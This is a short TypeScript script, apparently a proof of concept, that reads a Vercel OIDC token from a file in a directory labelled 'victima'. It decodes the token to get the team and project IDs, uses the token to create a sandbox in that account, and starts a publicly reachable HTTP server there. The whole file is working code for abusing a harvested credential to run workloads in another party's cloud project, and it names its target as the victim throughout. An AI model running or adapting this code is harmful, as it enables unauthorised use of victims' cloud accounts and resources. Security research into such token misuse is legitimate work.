import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.create({
    name: "victim-orig",
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
    template: "ubuntu",
    ports: [3000],
  });
  console.log("sandbox id:", sbx.id);
  console.log("domain(3000):", sbx.domain(3000));
  // start a listener so the port is reachable
  await sbx.runCommand("bash", ["-c", `python3 -m http.server 3000 --bind 0.0.0.0 >/tmp/srv.log 2>&1 & sleep 1; echo started`], { wait: true, timeout: 30_000 });
  await new Promise(r => setTimeout(r, 2000));
  console.log("PUBLIC_DOMAIN=" + sbx.domain(3000));
  await sbx.stop();
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
